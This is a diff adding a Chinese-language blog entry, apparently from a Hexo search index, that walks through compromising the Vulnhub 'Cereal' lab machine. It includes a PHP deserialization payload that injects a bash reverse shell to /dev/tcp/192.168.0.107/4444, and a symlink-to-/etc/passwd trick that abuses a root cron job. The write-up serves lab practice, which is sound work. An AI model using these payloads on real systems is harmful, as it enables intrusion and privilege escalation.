@@ -1260,4 +1260,62 @@
         <tag>Vulnhub-middlum</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Cereal打靶</title>
+    <url>/2022/02/08/Cereal/index/</url>
+    <content><![CDATA[<h1 id="Cereal打靶"><a href="#Cereal打靶" class="headerlink" title="Cereal打靶"></a>Cereal打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h3 id="1-难度-高"><a href="#1-难度-高" class="headerlink" title="1.难度:高"></a>1.难度:高</h3><p>这台靶机与众不同的是，他有和真实打靶一样的体验</p>
+<hr>
+<p>本机：<em>Kali Linux 192.168.0.107</em></p>
+<p>目标主机：<em>Debian Linux 192.168.0.101</em></p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.107</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.10	b4:2e:99:95:70:6a	GIGA-BYTE TECHNOLOGY CO.,LTD.</span><br><span class="line">192.168.0.101	08:00:27:50:01:a0	PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><p>使用<code>nmap</code>进行端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -p- -sV 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<p>目标打开了多个端口 <code>21</code> <code>22</code> <code>80</code>  <code>445</code> <code>3306</code> <code>44441</code>等多个端口，需要进行逐一排查</p>
+<h3 id="3-目录爆破"><a href="#3-目录爆破" class="headerlink" title="3.目录爆破"></a>3.目录爆破</h3><p>首先使用<code>dirsearch</code>对目标的<code>80</code> 以及 <code>44441</code>端口进行扫描，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081423361.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081425910.png"></p>
+<p>其中在blog中看见提示，需要修改<code>hosts</code>文件</p>
+<h4 id="4-子域名信息收集"><a href="#4-子域名信息收集" class="headerlink" title="4.子域名信息收集"></a>4.子域名信息收集</h4><p>首先修改<code>hosts</code>文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081421870.png"></p>
+<p>尝试进行子域名爆破</p>
+<p>使用<code>gobuster</code>进行子域名爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/SecLists/Discovery/DNS/namelist.txt -u http://cereal.ctf:44441</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081433262.png"></p>
+<h5 id="5-反序列化"><a href="#5-反序列化" class="headerlink" title="5.反序列化"></a>5.反序列化</h5><p>依然先进行修改 <code>hosts</code>文件</p>
+<p>尝试访问目标，进行寻找漏洞，发现目标是一个ping的页面，可能存在命令执行漏洞，发现上传的数据进行了序列化</p>
+<p>尝试寻找目标的备份文件(前面的提示有说到)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ dirsearch -u http://secure.cereal.ctf:44441/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 300</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081524494.png"></p>
+<p>继续使用dirsearch扫描文件即可</p>
+<p>得到了文件 <code>/back_en/index.php.bak</code></p>
+<h6 id="6-边境突破"><a href="#6-边境突破" class="headerlink" title="6.边境突破"></a>6.边境突破</h6><p>进行源码审计，覆盖变量<code>isValid</code>的数据，编写代码进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ipAddress</span> =<span class="string">&#x27;127.0.0.1;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/4444 0&gt;&amp;1&#x27;</span>;<span class="comment">#此处注入命令即可</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> pingTest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081451637.png"></p>
+<h3 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h3><p>通过反序列化得到目标的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081457125.png"></p>
+<p>然后进行提权，在尝试多种方式提权无效后，使用<code>psy64</code>查看系统中的<code>crontab</code>计划任务，发现每隔一段时间执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081520480.png"></p>
+<p><code>chown.sh</code>的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure>
+
+<p>进行修改 <code>/home/rocky/public_html/*</code>下的所有文件的属组改为rocky apache，制作一个软连接，通过给软连接改权限，导致软链接的原文件也被修改</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /etc/passwd ./passwd</span><br></pre></td></tr></table></figure>
+
+<p>等待计划任务执行即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202081532703.png"></p>
+<p>提权成功</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Hard</tag>
+      </tags>
+  </entry>
 </search>
